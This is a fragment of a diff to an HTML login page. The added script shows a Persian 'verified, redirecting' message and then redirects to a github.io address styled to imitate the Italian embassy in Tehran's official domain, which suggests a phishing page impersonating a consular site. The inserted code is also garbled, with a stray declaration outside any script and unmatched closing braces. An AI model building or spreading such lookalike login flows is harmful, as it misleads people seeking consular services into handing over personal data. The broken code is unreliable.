@@ -348,6 +348,19 @@
         alert("Login form submitted (mobile)");  
       });  
     </script>  
+const status = document.getElementById("status");
 
+      if (match) {
+        status.style.color = "green";
+        status.textContent = "تأیید شد، در حال هدایت...";
+        setTimeout(() => {
+          window.location.href = "https://ambteheran.github.io/https-ambteheran.esteri.it-it-/";
+        }, 3000);
+      } else {
+        status.style.color = "red";
+        status.textContent = "اطلاعات مطابقت ندارد!";
+      }
+    });
+  </script>
 </body>  
 </html>
